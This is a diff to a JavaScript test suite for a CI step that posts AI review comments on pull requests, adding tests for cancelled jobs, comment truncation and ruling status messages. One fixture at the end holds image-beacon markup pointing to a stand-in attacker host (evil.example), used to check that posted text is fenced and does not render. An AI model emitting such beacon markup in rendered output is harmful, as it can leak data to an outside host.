@@ -187,7 +187,7 @@ test('a ruling also covers a stale security flag', async () => {
 test('a ruling older than a result it would cover does not count', async () => {
   const r = await run([codexState({ code_review: review(HEAD, true), security_review: review(HEAD, false) }, '2026-10-20T12:00:00Z'), claudeComment(HEAD, 'findings'), ruling()],
     { threads: [thread(true)], codexFixes: 'false' });
-  assert.deepEqual(r.statuses, ['failure: findings to rule on from Claude']);
+  assert.deepEqual(r.statuses, ['failure: findings to rule on from Claude; ruling not counted: older than the latest review result']);
 });
 
 test('a ruling for another head does not count', async () => {
@@ -202,7 +202,7 @@ test('a ruling from anyone but the owner does not count', async () => {
 
 test('an open Codex thread still blocks a ruling', async () => {
   const r = await ruled([ruling()], { threads: [thread(true), thread(false)] });
-  assert.deepEqual(r.statuses, ['failure: findings to rule on from Codex and Claude']);
+  assert.deepEqual(r.statuses, ['failure: findings to rule on from Codex and Claude; ruling not counted: 1 Codex thread open']);
 });
 
 test('a ruling does not cover a security review still running', async () => {
@@ -482,13 +482,33 @@ test('the session finder and the extractor agree on the shape', async () => {
 
 // The post step: the text goes into a fence that outruns any backtick run in it, so nothing it holds renders.
 const postComment = stepScript('post', 'github', 'context');
-async function posted(text, verdict = 'findings', reason = '') {
+async function posted(text, verdict = 'findings', reason = '', { claudeResult = 'success', prHead = HEAD } = {}) {
   const bodies = [];
-  Object.assign(process.env, { HEAD_SHA: HEAD, VERDICT: verdict, TEXT: text, REASON: reason });
-  const github = { paginate: async () => [], rest: { issues: { listComments: () => {}, createComment: async ({ body }) => bodies.push(body), updateComment: async ({ body }) => bodies.push(body) } } };
+  Object.assign(process.env, { HEAD_SHA: HEAD, VERDICT: verdict, TEXT: text, REASON: reason, CLAUDE_RESULT: claudeResult });
+  const github = { paginate: async () => [], rest: {
+    pulls: { get: async () => ({ data: { head: { sha: prHead } } }) },
+    issues: { listComments: () => {}, createComment: async ({ body }) => bodies.push(body), updateComment: async ({ body }) => bodies.push(body) },
+  } };
   await postComment(github, { repo: { owner: 'o', repo: 'r' }, payload: { pull_request: { number: 7 } } });
   return bodies[0];
 }
+
+test('a review job cancelled while its head is still current posts "no verdict", so the status becomes an error', async () => {
+  const body = await posted('', 'unavailable', 'the job did not reach the verdict step', { claudeResult: 'cancelled' });
+  assert.match(body, /^<!-- ai-review:claude sha=a{40} verdict=unavailable -->/);
+  assert.match(body, /cancelled before a verdict/);
+});
+
+test('a review job cancelled by a newer push posts nothing', async () => {
+  assert.equal(await posted('', 'unavailable', '', { claudeResult: 'cancelled', prHead: OLD }), undefined);
+});
+
+test('a text past the comment limit is cut, keeping the marker and the fence', async () => {
+  const body = await posted(`VERDICT: FINDINGS\n${'1. [P1] a.js:1 — x\n'.repeat(5000)}`);
+  assert.ok(body.length <= 65536 && body.length > 60000, body.length);
+  assert.match(body, /^<!-- ai-review:claude sha=a{40} verdict=findings -->\n### Claude review/);
+  assert.match(body, /cut here: the comment limit was reached\n```$/);
+});
 
 test('the posted text is fenced, and the fence outruns the text', async () => {
   const text = 'VERDICT: FINDINGS\n1. [P1] a.js:1 — ![x](https://evil.example/?d=1) <img src="https://evil.example/?d=2"> ``` and ````';
